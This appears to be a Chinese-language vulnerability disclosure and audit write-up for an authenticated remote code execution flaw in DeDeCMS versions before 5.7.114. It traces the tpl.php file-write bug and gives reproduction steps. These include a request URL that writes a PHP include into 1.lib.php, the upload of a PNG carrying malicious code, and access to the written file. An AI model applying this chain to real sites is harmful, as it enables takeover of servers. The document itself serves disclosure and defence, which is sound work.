# ***\*漏洞情况\****

上海卓卓网络科技有限公司，后台存在RCE漏洞，攻击者可以利用此漏洞获取服务器权限

# ***\*影响版本\****

此漏洞涉及版本为DeDeCMS<5.7.114版本

# ***\*审计过程\****

在官网下载好源码使用

![image](https://github.com/tianqing191/test-/assets/114899974/4d1cebf1-71ef-4618-903e-34fe83047633)

## **漏洞涉及文件** 

 dede/tpl.php

![image](https://github.com/tianqing191/test-/assets/114899974/c1c6ebb4-ca78-4f27-a052-5df93bb1b48e)



在代码当中可以看到fwrite写入函数，其中第一个变量fp指定了一个文件为一个变量为truefile 其中truefile 是可控的

![image](https://github.com/tianqing191/test-/assets/114899974/f8528c93-c639-48a2-8caa-35ace4a947b6)


![image](https://github.com/tianqing191/test-/assets/114899974/08810b68-20ff-4101-a870-af31bba0fe49)


 并且 content 变量也是可控的

![image](https://github.com/tianqing191/test-/assets/114899974/fecd2f63-fee6-424a-a63f-17b702f26d76)


到这里大致的思路就明白了，使用fwrite函数进行了文件写入，写入文件为

1.lib.php,方便我们写入一句话，然后写入内容为content 变量，这

个变量我们可控，开始尝试写入一下

## **漏洞复现**

登陆后台

![image](https://github.com/tianqing191/test-/assets/114899974/df20e122-46a7-46fa-b8a8-dc25234b9268)


 

url/dede/tpl.php?filename=1.lib.php&action=savetagfile&content=<?=include_once("../../1.png");&token=[你的token]

 

![image](https://github.com/tianqing191/test-/assets/114899974/ca1b03c3-c1ae-4cb1-bad3-ff5834733a61)


写入成功文件名为1.lib.php 

![image](https://github.com/tianqing191/test-/assets/114899974/d493b81c-1a43-4e12-a3b3-40151e65de24)


写入的内容为

![image](https://github.com/tianqing191/test-/assets/114899974/a952c523-7d6e-452c-a76f-a6ebffc5892f)


其中变量content 存在过滤一些危险函数

![image](https://github.com/tianqing191/test-/assets/114899974/0c687e2c-c1f9-494a-ae8d-e7dcd5c76d4d)


通过写入php包含的函数，在进行上传一个带有恶意代码的png图片进行RCE

上传1.png图片 url/dede/file_manage_main.php

![image](https://github.com/tianqing191/test-/assets/114899974/ff2d8bc1-3d96-42d2-ad73-defdcf64f817)

访问1.lib.php文件 url/include/taglib/1.lib.php

![image](https://github.com/tianqing191/test-/assets/114899974/c8244720-f43f-4910-bfc3-e479df4f89e0)


成功RCE

 

 
